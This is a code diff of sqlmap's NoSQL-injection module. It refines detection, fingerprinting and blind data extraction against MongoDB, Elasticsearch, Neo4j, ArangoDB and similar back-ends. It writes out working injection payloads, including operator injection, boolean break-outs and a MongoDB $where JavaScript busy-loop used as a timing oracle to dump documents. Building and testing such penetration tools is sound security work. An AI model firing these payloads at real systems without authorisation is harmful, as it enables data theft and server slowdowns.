@@ -5,7 +5,6 @@ Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import difflib
 import json
 import re
 import time
@@ -15,6 +14,17 @@ from collections import OrderedDict
 
 from lib.core.common import beep
 from lib.core.common import randomStr
+from lib.core.convert import getUnicode
+from lib.utils.nonsql import userDecision
+from lib.utils.nonsql import sqlErrorPresent
+from lib.utils.nonsql import blockedStatus
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import userOracleActive
+from lib.utils.nonsql import InconclusiveError
+from lib.utils.nonsql import INCONCLUSIVE_MARK
+from lib.utils.nonsql import resolveBit
+from lib.utils.nonsql import decide as _decide
+from lib.utils.nonsql import Decision as _Decision
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -39,8 +49,11 @@ NOSQL_SENTINEL = randomStr(length=10, lowercase=True)
 # Maximum number of characters of in-band (reflected) data surfaced from an always-true response
 NOSQL_DUMP_LIMIT = 4096
 
-# Delivery shapes that can carry an injection into a back-end filter/query
-NOSQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.URI, PLACE.CUSTOM_POST, PLACE.COOKIE)
+# Delivery shapes that can carry an injection into a back-end filter/query. PLACE.URI is intentionally
+# NOT listed: `_send` has no path-segment mutation (it would route a URI point through the generic
+# form/query serializer, corrupting the request), so advertising it would be a false promise. Add it
+# back only alongside real URI-marker (`*`) path mutation through sqlmap's URI machinery.
+NOSQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST, PLACE.COOKIE)
 
 # Lucene regexp metacharacters (Elasticsearch/Solr) requiring escaping in built patterns
 LUCENE_META = set('.?+*|(){}[]"\\/')
@@ -63,15 +76,26 @@ _UNSET = object()
 # HTTP status of the most recent request issued by _send() (None when bypassed, e.g. under tests)
 _lastCode = None
 
+# set by _isError() whenever a probe response carries a recognized SQL/DBMS error - a strong sign
+# the parameter is plainly SQL-injectable (not NoSQL); surfaced as a hint when nothing NoSQL matches
+_sqlErrorSeen = False
+
 # Resolved injection vector. `template` is the always-true page for content-based blind extraction
 # (None for time-based/detection-only); `bypass` is the always-true payload reported as a login/filter
 # bypass; `truth` overrides the content oracle (e.g. a timing predicate for the $where time-based path);
 # `dump` is a callable returning (columns, rows) for a whole-document dump (server-side-JS key enumeration).
-Vector = namedtuple("Vector", ("dbms", "fetch", "lengthValue", "charValue", "template", "bypass", "truth", "dump"))
-Vector.__new__.__defaults__ = (None, None, None, None)
+# `bound` records whether a whole-document dump is provably tied to ONE record (a unique-ish sibling
+# constraint pins it, or the walk keys on a unique per-record id like a Neo4j node id). When False the
+# recovered fields may come from DIFFERENT matching documents, so the output is labelled representative
+# rather than presented as one coherent document.
+# `falseModel` is the always-FALSE (never-match) page, calibrated alongside `template` (the always-true
+# page). Content-based blind extraction classifies each bit RELATIVE to BOTH models (shared resolveBit),
+# so an unrelated usable page (session-expired / CAPTCHA / soft-WAF / validation) leans to neither and is
+# INCONCLUSIVE rather than a fabricated false bit. When a false model cannot be calibrated, content
+# extraction is DISABLED for that vector (never silently one-sided).
+Vector = namedtuple("Vector", ("dbms", "fetch", "lengthValue", "charValue", "template", "bypass", "truth", "dump", "bound", "falseModel"))
+Vector.__new__.__defaults__ = (None, None, None, None, True, None)
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 def _encode(value):
     return _urllib.parse.quote(value, safe="")
@@ -95,6 +119,181 @@ def _jsonKey(parameter):
         if parameter.startswith(prefix):
             return parameter[len(prefix):]
     return parameter
+
+# --- JSON / JSON-like lexical scanner -----------------------------------------------------------
+# These skips give the mutation locator a real tokenizer's states so a 'key:'-looking fragment inside
+# a string, comment, backtick template, or regex literal is never mistaken for a property, and a
+# '}'/']' inside any of those never closes an object/array value early.
+
+def _skipString(body, i):
+    """`body[i]` is an opening quote (", ' or `); return the index just past the closing quote."""
+    q, n, j, esc = body[i], len(body), i + 1, False
+    while j < n:
+        c = body[j]
+        if esc:
+            esc = False
+        elif c == "\\":
+            esc = True
+        elif c == q:
+            return j + 1
+        j += 1
+    return n
+
+
+def _skipComment(body, i):
+    """`body[i:i+2]` is `//` or `/*`; return the index just past the comment."""
+    if body[i + 1] == "/":
+        j = body.find("\n", i)
+        return len(body) if j == -1 else j + 1
+    j = body.find("*/", i + 2)
+    return len(body) if j == -1 else j + 2
+
+
+def _skipRegex(body, i):
+    """`body[i]` is `/` in a value position; return the index past the closing `/` AND any trailing
+    flag letters (e.g. `/abc/gi`) of a JS regex literal (honouring `[...]` character classes and
+    escapes), or None when it is not a regex (no close on the line). Consuming the flags matters: a
+    regex VALUE's span must cover `/abc/i` in full, else the mutation would leave a dangling `i`."""
+    n, j, esc, inClass = len(body), i + 1, False, False
+    while j < n:
+        c = body[j]
+        if esc:
+            esc = False
+        elif c == "\\":
+            esc = True
+        elif c == "[":
+            inClass = True
+        elif c == "]":
+            inClass = False
+        elif c == "\n":
+            return None
+        elif c == "/" and not inClass:
+            j += 1
+            while j < n and body[j].isalpha():          # consume trailing regex flags (g/i/m/s/u/y/...)
+                j += 1
+            return j
+        j += 1
+    return None
+
+
+def _jsonValueSpan(body, pos):
+    """Given `pos` just after a property's ':', return the [start, end) span of its value token - a
+    quoted/backtick string, a regex literal, a balanced object/array, or a scalar - or None. Strings,
+    comments and regex literals inside an object/array value are skipped so a '}'/']'/quote/':' within
+    any of them does not close the token early."""
+    n = len(body)
+    while pos < n and body[pos] in " \t\r\n":
+        pos += 1
+    if pos >= n:
+        return None
+    c = body[pos]
+    if c in ('"', "'", "`"):
+        return (pos, _skipString(body, pos))
+    if c == "/" and pos + 1 < n and body[pos + 1] not in "/*":      # regex-literal value
+        end = _skipRegex(body, pos)
+        return (pos, end if end else pos + 1)
+    if c in "{[":
+        close = "}" if c == "{" else "]"
+        depth, j = 0, pos
+        while j < n:
+            cj = body[j]
+            if cj in ('"', "'", "`"):
+                j = _skipString(body, j)
+                continue
+            if cj == "/" and j + 1 < n and body[j + 1] in "/*":
+                j = _skipComment(body, j)
+                continue
+            if cj == "/" and j + 1 < n:                             # possible regex inside the value
+                r = _skipRegex(body, j)
+                if r:
+                    j = r
+                    continue
+            if cj == c:
+                depth += 1
+            elif cj == close:
+                depth -= 1
+                if depth == 0:
+                    return (pos, j + 1)
+            j += 1
+        return None
+    j = pos
+    while j < n and body[j] not in ",}] \t\r\n":
+        j += 1
+    return (pos, j)
+
+
+def _jsonLocateValues(body, key):
+    """Return the [start, end) value span of EVERY genuine property named `key`. A genuine property
+    name is a quoted or bareword token OUTSIDE strings, comments, backtick templates and regex literals,
+    followed by ':', so a 'key:'-looking fragment inside any of those is never matched (the reviewer's
+    `{"note":"name: x",...}` and `{pattern:/name: trap/,...}` cases). `prevSig` tracks the last
+    significant char so a '/' in value position is read as a regex literal rather than division."""
+    n, i = len(body), 0
+    prevSig = "{"                                   # a key/value is expected at the start
+    spans = []
+    while i < n:
+        c = body[i]
+        if c in " \t\r\n":
+            i += 1
+            continue
+        if c == "/" and i + 1 < n and body[i + 1] in "/*":
+            i = _skipComment(body, i)
+            continue
+        if c == "/" and prevSig in ":,[{(=":        # regex literal in value position -> skip it whole
+            r = _skipRegex(body, i)
+            if r:
+                prevSig = "/"
+                i = r
+                continue
+        if c in ('"', "'", "`"):
+            end = _skipString(body, i)
+            k = end
+            while k < n and body[k] in " \t\r\n":
+                k += 1
+            # a quoted (not backtick) token immediately followed by ':' is a property name
+            if c in ('"', "'") and body[i + 1:end - 1] == key and k < n and body[k] == ":":
+                span = _jsonValueSpan(body, k + 1)
+                if span:
+                    spans.append(span)
+                    i = span[1]                     # continue past the value to find other occurrences
+                    prevSig = "v"
+                    continue
+            prevSig, i = c, end
+            continue
+        if c.isalpha() or c == "_":                 # a bareword token (JSON-like unquoted key)
+            start = i
+            while i < n and (body[i].isalnum() or body[i] in "_$"):
+                i += 1
+            k = i
+            while k < n and body[k] in " \t\r\n":
+                k += 1
+            if body[start:i] == key and k < n and body[k] == ":":
+                span = _jsonValueSpan(body, k + 1)
+                if span:
+                    spans.append(span)
+                    i = span[1]
+                    prevSig = "v"
+                    continue
+            prevSig = "w"
+            continue
+        prevSig = c
+        i += 1
+    return spans
+
+
+def _jsonRawReplace(body, parameter, jsonValue):
+    """Replace ONLY the target property's value span with `json.dumps(jsonValue)`, located by the
+    string/comment/regex-aware scanner (never a regex sub, never a form serializer). Handles a value
+    that is a string, number, bool/null, object, array, or regex-with-flags, and preserves the rest of
+    the body byte-for-byte. With only the leaf key name available (no parsed path), an AMBIGUOUS body -
+    the same key name appearing at more than one place/depth - is NOT guessed: the probe is SKIPPED
+    (returns None) rather than mutate the wrong field. Returns None when the property is absent or
+    ambiguous (caller skips the probe)."""
+    spans = _jsonLocateValues(body, _jsonKey(parameter))
+    if len(spans) != 1:                             # 0 = not found, >1 = ambiguous -> skip, never guess
+        return None
+    start, end = spans[0]
+    return body[:start] + json.dumps(jsonValue) + body[end:]
 
 def _delim(place):
     # parameter delimiter for the place: ';' for cookies (per --cookie-del), '&' otherwise
@@ -141,13 +340,19 @@ def _send(place, parameter, segment=None, jsonValue=_UNSET):
     try:
         kwargs = {"raise404": False, "silent": True}
 
-        if jsonValue is not _UNSET and _isJsonBody() and place in (PLACE.POST, PLACE.CUSTOM_POST):
-            try:
-                data = json.loads(conf.data)
-            except Exception:
-                data = {}
-            data[_jsonKey(parameter)] = jsonValue
-            payload = kwargs["post"] = json.dumps(data)
+        jsonBody = jsonValue is not _UNSET and _isJsonBody() and place in (PLACE.POST, PLACE.CUSTOM_POST)
+        if jsonBody:
+            # Mutate ONLY the target property's value span in place, located by a string/comment-aware
+            # scanner. This is used for BOTH strict and JSON-like bodies: it is structurally safe (never
+            # matches a 'key:' fragment inside a string/comment), handles a value at any depth and of any
+            # type (string/number/object/array), preserves the rest of the body byte-for-byte, and never
+            # falls back to a form serializer. When the exact property cannot be located, SKIP the probe
+            # rather than send a corrupted body (a fabricated diff would be a false positive).
+            payload = _jsonRawReplace(conf.data, parameter, jsonValue)
+            if payload is None:
+                logger.debug("NoSQL: JSON property '%s' not locatable in the body; skipping probe" % _jsonKey(parameter))
+                return None
+            kwargs["post"] = payload
         elif place == PLACE.COOKIE:
             payload = kwargs["cookie"] = _replaceSegment(place, parameter, segment)
         else:
@@ -156,15 +361,32 @@ def _send(place, parameter, segment=None, jsonValue=_UNSET):
 
         logger.log(CUSTOM_LOGGING.PAYLOAD, _urllib.parse.unquote(payload))     # readable, surfaced at -v 3 like a regular sqlmap payload
         page, _, _lastCode = Request.getPage(**kwargs)
+    except Exception as ex:                     # a transport failure must never enter the oracle as ""
+        logger.debug("NoSQL probe request failed: %s" % getUnicode(ex))
+        _lastCode = None
+        return None
     finally:
         conf.skipUrlEncode = skipUrlEncode
 
     return page or ""
 
 def _isError(page):
-    # a server-error status or a recognizable back-end error body marks a response as NOT a valid
-    # always-true template (prevents two differing error pages from faking a boolean oracle)
-    return (_lastCode or 0) >= 500 or bool(re.search(NOSQL_ERROR_REGEX, page or ""))
+    # a server-error status, a recognizable NoSQL error body, OR a recognized SQL/DBMS error marks a
+    # response as NOT a valid always-true template (prevents two differing error pages from faking a
+    # boolean oracle). The SQL/DBMS check is essential: a payload that trips a DBMS syntax error (e.g.
+    # numeric `cat=*` on MySQL -> "You have an error in your SQL syntax") yields a STABLE page that
+    # merely DIFFERS from a no-match page, which would otherwise fake a boolean oracle and misreport a
+    # plainly SQL-injectable parameter as NoSQL. htmlParser() reuses sqlmap's errors.xml signatures.
+    global _sqlErrorSeen
+    # a server error (>=500) or a WAF/rate-limit block (403/429) is BLOCKED/ERROR, never a valid
+    # template - a mid-scan 429 or a 403 block page must not be read as a "false" (or as divergence)
+    if blockedStatus(_lastCode) or bool(re.search(NOSQL_ERROR_REGEX, page or "")):
+        return True
+    # a DBMS-identifiable error (errors.xml signatures) OR sqlmap's generic SQL-error marker
+    if sqlErrorPresent(page):
+        _sqlErrorSeen = True
+        return True
+    return False
 
 def _fetch(place, parameter, op, value, isArray=False):
     """MongoDB/CouchDB dialect: renders the parameter as an operator object (bracket or JSON shape)"""
@@ -183,14 +405,37 @@ def _boolean(truthy, falsy):
     content divergence - i.e. the payload reached and influenced the back-end - else None"""
 
     truePage = truthy()
-    if not truePage or _isError(truePage):      # an error response is never a valid always-true template
+    if not truePage or _isError(truePage):      # an error/blocked response is never a valid template
+        return None
+    if _ratio(truePage, truthy()) <= UPPER_RATIO_BOUND:     # the TRUE side must independently reproduce
         return None
 
     falsePage = falsy()
-    if _ratio(truePage, truthy()) > UPPER_RATIO_BOUND and _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
+    if not falsePage or _isError(falsePage):    # a false-side error must not pass as "divergence"
+        return None
+    if _ratio(falsePage, falsy()) <= UPPER_RATIO_BOUND:     # the FALSE side must independently reproduce too
+        return None
+
+    # with an explicit user oracle (--string/--not-string/--regexp), require the true page to classify
+    # TRUE and the false page FALSE - do not fall back to raw similarity that the user overrode
+    if userOracleActive():
+        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None
+
+    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:     # ... and true must differ from false
         return truePage
 
     return None
+
+def _reproduced(sendFn):
+    """Send a never-matching (always-FALSE) payload twice and return its page as the FALSE model, or
+    None when it is unusable or not reproducible. Used to calibrate the false model each content vector
+    carries so extraction classifies bits relative to BOTH models (else extraction is disabled)."""
+    p1 = sendFn()
+    if not p1 or _isError(p1):
+        return None
+    if _ratio(p1, sendFn()) <= UPPER_RATIO_BOUND:
+        return None
+    return p1
 
 def _detectMongo(place, parameter):
     # $ne (matches everything) vs $in [sentinel] (matches nothing); $gt '' (matches any string) is a
@@ -199,8 +444,17 @@ def _detectMongo(place, parameter):
         or _boolean(lambda: _fetch(place, parameter, "$gt", ""), lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True))
 
 def _detectES(place, parameter):
-    # query_string '*' (matches everything) vs a literal sentinel (matches nothing)
-    return _boolean(lambda: _fetchValue(place, parameter, '*'), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))
+    # '*' (matches everything) vs a literal sentinel (matches nothing) is a cheap FIRST-PASS trigger,
+    # but on its own it is NOT proof of injection: many search APIs treat '*' as a wildcard by design.
+    template = _boolean(lambda: _fetchValue(place, parameter, '*'), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))
+    if not template:
+        return None
+    # STRUCTURAL proof the value is parsed as a Lucene query_string (not used as a literal search term):
+    # boolean operators the parser evaluates - `(NOT <rand>)` matches all, `(<rand> AND NOT <rand>)`
+    # matches nothing - whereas a plain wildcard-search box treats both as a literal string (no divergence).
+    if not _confirm(place, parameter, "(NOT %s)" % NOSQL_SENTINEL, "(%s AND NOT %s)" % (NOSQL_SENTINEL, NOSQL_SENTINEL)):
+        return None
+    return template
 
 def _detectCypher(place, parameter):
     # single-quote break-out: OR '1'='1' (true) vs OR '1'='2' (false)
@@ -220,19 +474,33 @@ def _detectNumeric(place, parameter):
 
     template = _boolean(lambda: _fetchValue(place, parameter, "%s OR 1=1" % value), lambda: _fetchValue(place, parameter, "%s AND 1=2" % value))
     if template:
-        # Cypher, N1QL and PartiQL share OR/AND; tell them apart by a constant-arg, field-free primitive
-        # each engine alone honors: N1QL REGEXP_CONTAINS, DynamoDB begins_with (Cypher has neither)
+        # CRITICAL: `OR 1=1`/`AND 1=2` is IDENTICAL to classic SQL injection, so a bare divergence here
+        # is AMBIGUOUS - a plain SQL-injectable numeric parameter diverges exactly the same way. It is a
+        # NoSQL finding ONLY when an engine-SPECIFIC primitive (one no SQL back-end implements) ALSO
+        # confirms: N1QL REGEXP_CONTAINS, DynamoDB begins_with, Cypher STARTS WITH. Without such positive
+        # proof we must NOT attribute a DBMS (the old `else: Neo4j` default turned every SQL-injectable
+        # numeric parameter into a false Neo4j positive) - return None and let SQL detection handle it.
         if _confirm(place, parameter, "%s OR REGEXP_CONTAINS('ab', 'a') OR 1=2" % value, "%s OR REGEXP_CONTAINS('ab', 'z') OR 1=2" % value):
             dbms = "Couchbase"
         elif _confirm(place, parameter, "%s OR begins_with('ab', 'a') OR 1=2" % value, "%s OR begins_with('ab', 'z') OR 1=2" % value):
             dbms = "DynamoDB"
-        else:
+        elif _confirmBattery(place, parameter,
+                             lambda p: "%s OR %s OR 1=2" % (value, p),
+                             lambda p: "%s OR %s OR 1=2" % (value, p), _CYPHER_PREDICATES):
             dbms = "Neo4j"
+        else:
+            return None
         return dbms, template, "%s OR 1=1" % value
 
     template = _boolean(lambda: _fetchValue(place, parameter, "%s || 1==1" % value), lambda: _fetchValue(place, parameter, "%s && 1==2" % value))
     if template:
-        return "ArangoDB", template, "%s || 1==1" % value
+        # AQL `||`/`&&`/`==`; a PIPES_AS_CONCAT SQL engine can partly mimic `||`, so require a positive
+        # AQL-specific primitive from the battery (functions SQL lacks: two-arg LIKE, CONTAINS, LENGTH, REGEX_TEST)
+        if _confirmBattery(place, parameter,
+                           lambda p: "%s || %s || 1==2" % (value, p),
+                           lambda p: "%s || %s || 1==2" % (value, p), _AQL_PREDICATES):
+            return "ArangoDB", template, "%s || 1==1" % value
+        return None
 
     return None
 
@@ -242,7 +510,7 @@ def _detectError(place, parameter):
     normal = _fetchValue(place, parameter, original)
     broken = _fetchValue(place, parameter, original + "'")
 
-    if not normal or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
+    if not normal or not broken or _ratio(normal, broken) >= UPPER_RATIO_BOUND:   # None broken -> no crash on .lower()
         return None
 
     for engine, tokens in ERROR_SIGNATURES:
@@ -257,22 +525,26 @@ def _detectError(place, parameter):
     return None
 
 def _fingerprintMongo(place, parameter):
-    page = _fetch(place, parameter, "$regex", '(').lower()       # invalid regexp -> driver/DB error
+    page = (_fetch(place, parameter, "$regex", '(') or "").lower()   # invalid regexp -> driver/DB error (None-safe)
     if any(_ in page for _ in ("couch", "mango", "bad_arg", "erlang")):
         return "CouchDB"
     elif any(_ in page for _ in ("mongo", "bson", "regular expression", "$regex")):
         return "MongoDB"
     else:
-        return "MongoDB (assumed)"
+        # operator injection worked but no product-specific signature leaked - name the FAMILY,
+        # not a specific product we cannot prove
+        return "MongoDB/CouchDB-compatible operator back-end"
 
 def _fingerprintLucene(place, parameter):
-    page = _fetchValue(place, parameter, "/[/").lower()          # invalid regexp -> engine error
+    page = (_fetchValue(place, parameter, "/[/") or "").lower()      # invalid regexp -> engine error (None-safe)
     if any(_ in page for _ in ("solr", "solrexception")):
         return "Solr"
     elif "opensearch" in page:
         return "OpenSearch"
     else:
-        return "Elasticsearch"
+        # Lucene query_string parsing confirmed but no product signature - name the FAMILY (this is
+        # most commonly Elasticsearch, but Solr/OpenSearch/Lucene share the syntax)
+        return "Lucene query_string-compatible back-end"
 
 def _constraint(place, parameter, eq='=', conj=" AND ", prefix="u."):
     """Re-expresses sibling parameters as query constraints (field == parameter name) so extraction
@@ -286,8 +558,17 @@ def _constraint(place, parameter, eq='=', conj=" AND ", prefix="u."):
             continue
         name, _, value = segment.partition('=')
         name = name.strip()
-        if name and name != parameter:
-            parts.append("%s%s%s'%s'" % (prefix, name, eq, value))
+        if not name or name == parameter:
+            continue
+        # only bind a sibling whose name is a plain field identifier: a dotted/quoted/operator/spaced
+        # name could change the PREDICATE STRUCTURE (not just add a filter) once interpolated, so it is
+        # skipped rather than trusted (the reviewer's "verified relationship" bar)
+        if not re.match(r"(?i)\A[a-z_][\w]*\Z", name):
+            continue
+        # escape the literal so a quote/backslash in the value cannot break out of the single-quoted
+        # string and alter/invalidate the predicate (Cypher/AQL/$where-JS all single-quote + backslash)
+        literal = value.replace("\\", "\\\\").replace("'", "\\'")
+        parts.append("%s%s%s'%s'" % (prefix, name, eq, literal))
 
     return (conj.join(parts) + conj) if parts else ""
 
@@ -296,55 +577,171 @@ def _confirm(place, parameter, truePayload, falsePayload):
     # regexp-match primitive (e.g. Cypher '=~' vs N1QL 'REGEXP_CONTAINS') for a true/false divergence
     return _boolean(lambda: _fetchValue(place, parameter, truePayload), lambda: _fetchValue(place, parameter, falsePayload)) is not None
 
+# Engine-specific primitive BATTERIES: each pair is (true_predicate, false_predicate) that differ
+# ONLY in the engine-unique construct, so the divergence is attributable to that construct alone (a
+# SQL back-end errors on every one of them -> no divergence). A rich battery (not a single primitive)
+# makes attribution robust to an injection context that rejects any one function AND, by WHICH members
+# fire, fingerprints the engine. Live-validated on the karlobag testbed (each flips on the real engine,
+# none flips on the MySQL junkyard). Constant expressions only (no field reference needed).
+_CYPHER_PREDICATES = (                                          # Neo4j Cypher
+    ("'ab' STARTS WITH 'a'", "'ab' STARTS WITH 'z'"),
+    ("'ab' ENDS WITH 'b'",   "'ab' ENDS WITH 'z'"),
+    ("'ab' CONTAINS 'a'",    "'ab' CONTAINS 'z'"),
+    ("size(['a','b'])=2",    "size(['a','b'])=3"),
+    ("toInteger('7')=7",     "toInteger('7')=8"),
+)
+_AQL_PREDICATES = (                                             # ArangoDB AQL
+    ("LIKE('ab', 'a%')",     "LIKE('ab', 'z%')"),
+    ("CONTAINS('ab', 'a')",  "CONTAINS('ab', 'z')"),
+    ("LENGTH('ab')==2",      "LENGTH('ab')==3"),
+    ("REGEX_TEST('ab','^a')", "REGEX_TEST('ab','^z')"),
+)
+
+def _confirmBattery(place, parameter, wrapTrue, wrapFalse, battery):
+    """Positive engine proof: return True as soon as ANY battery predicate flips true/false in the
+    verified break-out context. `wrapTrue`/`wrapFalse` are callables mapping a predicate to a payload."""
+    for truePred, falsePred in battery:
+        if _confirm(place, parameter, wrapTrue(truePred), wrapFalse(falsePred)):
+            return True
+    return False
+
 def _timed(call):
     start = time.time()
     call()
     return time.time() - start
 
+# --- tri-state extraction oracle (shared contract with the XPath/LDAP/HQL/GraphQL engines) ----------
+# A failed / blocked / error response is UNKNOWN, never a silent False bit. These resolvers reject an
+# unusable response, RE-SEND it up to a bound, and raise InconclusiveError on persistent ambiguity so
+# the per-value extractor aborts (returns None) instead of fabricating a length/char/count. `_NOSQL_RETRIES`
+# is small - a couple of fresh sends are enough to ride out transient jitter.
+_NOSQL_RETRIES = 2
+
+
+def _contentBit(fetchFn, value, trueModel, falseModel=None, retries=_NOSQL_RETRIES):
+    """Tri-state CONTENT bit. An unusable response (None / blocked / DBMS-error) is retried, then aborts
+    (InconclusiveError). When a `falseModel` is available, a usable page is classified RELATIVE to BOTH
+    models via the shared `resolveBit`: it must lean clearly to the true model over the false model by a
+    margin, else it is INCONCLUSIVE (re-sent, then aborts) - so an unrelated usable page (session-expired,
+    soft-WAF, validation) becomes UNKNOWN, never a false bit that corrupts the value. Without a false
+    model (legacy callers) it falls back to a true-model similarity threshold."""
+
+    def send():
+        page = fetchFn(value)
+        return None if (page is None or _isError(page)) else page
+
+    if falseModel is not None:
+        return resolveBit(send(), trueModel, falseModel, send, retries=retries)
+
+    for _attempt in range(retries + 1):
+        page = send()
+        if page is not None:
+            return _ratio(page, trueModel) > UPPER_RATIO_BOUND
+    raise InconclusiveError()
+
+
+def _timedResponse(place, parameter, payload):
+    """Return (elapsed_seconds, usable) for a timing probe. `usable` is False for a transport failure or
+    a blocked/error response, so a WAF-induced delay can never be read as a true timing bit."""
+    start = time.time()
+    page = _fetchValue(place, parameter, payload)
+    elapsed = time.time() - start
+    return elapsed, (page is not None and not _isError(page))
+
+
+def _timedBit(place, parameter, payload, threshold, retries=_NOSQL_RETRIES):
+    """Tri-state TIMING bit with an ambiguity band. A usable reading clearly above threshold+margin is
+    True; clearly below threshold-margin is False; a reading NEAR the threshold (or an unusable one) is
+    RE-SAMPLED, and if it never separates cleanly the bit aborts (InconclusiveError) rather than being
+    guessed. A blocked/error response is never counted as a (slow) true bit."""
+    margin = max(0.5, conf.timeSec * 0.25)
+    for _attempt in range(retries + 2):
+        elapsed, usable = _timedResponse(place, parameter, payload)
+        if not usable:
+            continue
+        if elapsed > threshold + margin:
+            return True
+        if elapsed < threshold - margin:
+            return False
+        # near the threshold: do not decide on one ambiguous sample - loop and re-sample
+    raise InconclusiveError()
+
 def _whereDelay(condition):
     # MongoDB $where (server-side JS) string break-out: busy-loops for ~conf.timeSec seconds whenever
     # the per-document JS `condition` holds, yielding a timing oracle when no content differential
     # exists. The document is passed in as `d` (inside the function `this` is not the document).
-    return "%s' || (function(d){if(%s){var t=new Date().getTime();while(new Date().getTime()-t<%d){}}return false})(this) || '1'=='2" % (NOSQL_SENTINEL, condition, int(conf.timeSec * 1000))
+    #
+    # DoS BOUND: `$where` runs the function for EVERY document in the collection, so an unconditional or
+    # loose `condition` on a large collection would busy-loop docCount*timeSec seconds and hang the
+    # server on a single request. A counter kept in the shared per-query JS scope (`__c`, an implicit
+    # global assigned across document invocations) caps the busy-loop to ONE document per request: the
+    # timing oracle is unchanged (a slow response still means at least one document matched), but the
+    # added latency is ~timeSec regardless of collection size. On a MongoDB build that isolates the
+    # scope per invocation the cap simply never trips and behaviour degrades to the old per-doc loop.
+    return "%s' || (function(d){if(typeof __c=='undefined'){__c=0;}if(__c<1&&(%s)){__c=1;var t=new Date().getTime();while(new Date().getTime()-t<%d){}}return false})(this) || '1'=='2" % (NOSQL_SENTINEL, condition, int(conf.timeSec * 1000))
 
 def _detectWhere(place, parameter):
-    # an unconditional-delay payload must run ~conf.timeSec slower than the baseline - and do so
-    # TWICE, to reject a one-off jitter spike - while a non-delaying one stays fast (the latter
-    # guards against a uniformly slow endpoint)
-    delayed = lambda: _timed(lambda: _fetchValue(place, parameter, _whereDelay("true")))
-    threshold = _timed(lambda: _fetchValue(place, parameter, _originalValue(place, parameter) or "1")) + conf.timeSec * 0.5
-    if threshold < conf.timeSec and delayed() > threshold and delayed() > threshold:
-        if _timed(lambda: _fetchValue(place, parameter, "%s' || '1'=='2" % NOSQL_SENTINEL)) <= threshold:
-            return threshold
+    # An unconditional-delay payload must run ~conf.timeSec slower than the baseline - and do so TWICE,
+    # from USABLE responses, to reject a one-off jitter spike - while a non-delaying control stays fast.
+    # Every measurement is (elapsed, usable): a delayed BLOCKED/failed response (WAF/5xx) is NOT a valid
+    # slow sample, so a soft-blocking WAF can no longer establish a time-based $where finding.
+    baseDt, baseUsable = _timedResponse(place, parameter, _originalValue(place, parameter) or "1")
+    if not baseUsable:
+        return None
+    threshold = baseDt + conf.timeSec * 0.5
+
+    def slow():
+        dt, usable = _timedResponse(place, parameter, _whereDelay("true"))
+        return usable and dt > threshold
+
+    def fastControl():
+        dt, usable = _timedResponse(place, parameter, "%s' || '1'=='2" % NOSQL_SENTINEL)
+        return usable and dt <= threshold
+
+    if slow() and slow() and fastControl():
+        return threshold
     return None
 
 def _jsString(value):
     return "'%s'" % value.replace("\\", "\\\\").replace("'", "\\'")
 
-def _whereField(place, parameter, bound, expr, threshold):
+def _whereField(place, parameter, bound, expr, threshold, strict=False):
     """Time-based recovery of an arbitrary per-document JavaScript string expression `expr` (e.g. a key
-    name 'Object.keys(d)[i]', or a value 'String(d[name])') via the $where busy-loop oracle"""
+    name 'Object.keys(d)[i]', or a value 'String(d[name])') via the $where busy-loop oracle. `strict`
+    propagates InconclusiveError (for structural key-name probes) instead of returning None."""
 
-    truth = lambda payload: _timed(lambda: _fetchValue(place, parameter, payload)) > threshold
+    # tri-state timing bit: a blocked/error response is never read as a (slow) true bit, and a
+    # persistently unusable probe raises InconclusiveError so the value aborts instead of fabricating
+    truth = lambda payload: _timedBit(place, parameter, payload, threshold)
     return _extract(None, None,
                     lambda n: _whereDelay("%s(%s)&&(%s).length>=%d" % (bound, expr, expr, n)),
                     lambda known, klass: _whereDelay("%s/^%s%s/.test(%s)" % (bound, _javaEscape(known), klass, expr)),
-                    truth)
+                    truth, strict=strict)
 
 def _whereDump(place, parameter, bound, threshold):
     """Whole-document dump via server-side-JavaScript key enumeration: walk Object.keys(this) to recover
-    each field name, then String(this[name]) for its value. Returns (columns, rows) or None"""
+    each field name, then String(this[name]) for its value. Returns (columns, rows, bound)."""
 
-    columns, values = [], []
+    columns, values, partial = [], [], False
     for index in xrange(NOSQL_MAX_FIELDS):
-        name = _whereField(place, parameter, bound, "Object.keys(d)[%d]" % index, threshold)
-        if not name:
+        try:
+            name = _whereField(place, parameter, bound, "Object.keys(d)[%d]" % index, threshold, strict=True)
+        except InconclusiveError:
+            partial = True                          # inconclusive NEXT field name != end of fields
+            logger.warning("$where field enumeration became inconclusive at index %d; dump is PARTIAL" % index)
+            break
+        if not name:                                # genuine end (no more keys)
             break
         columns.append(name)
-        values.append(_whereField(place, parameter, bound, "String(d[%s])" % _jsString(name), threshold) or "")
+        cell = _whereField(place, parameter, bound, "String(d[%s])" % _jsString(name), threshold)
+        values.append(INCONCLUSIVE_MARK if cell is None else cell)   # None => aborted; keep distinguishable from ""
         logger.info("retrieved: %s='%s'" % (name, values[-1]))
 
-    return (columns, [values]) if columns else None
+    if partial:
+        logger.warning("$where document dump is INCOMPLETE (field enumeration aborted)")
+    # NOT bound: a $where key-walk is not pinned to a native _id, so with a loose/absent constraint the
+    # keys and values can come from different matching documents. `complete` = not partial.
+    return (columns, [values], False, not partial) if columns else None
 
 def _classChar(ordinal):
     char = chr(ordinal)
@@ -357,13 +754,16 @@ def _klass(low, high):
 def _propLiteral(name):
     return "'%s'" % name.replace("\\", "\\\\").replace("'", "\\'")
 
-def _enumField(place, parameter, template, payloadFor):
+def _enumField(place, parameter, template, payloadFor, strict=False, falseModel=None):
     """Content-based recovery of the string matched by a regexp clause built via payloadFor(regexBody),
-    reusing the bisection extractor against the always-true single-record `template`"""
+    reusing the bisection extractor against the always-true single-record `template`. `strict`
+    propagates InconclusiveError (for structural field-name probes); `falseModel` (a never-matching
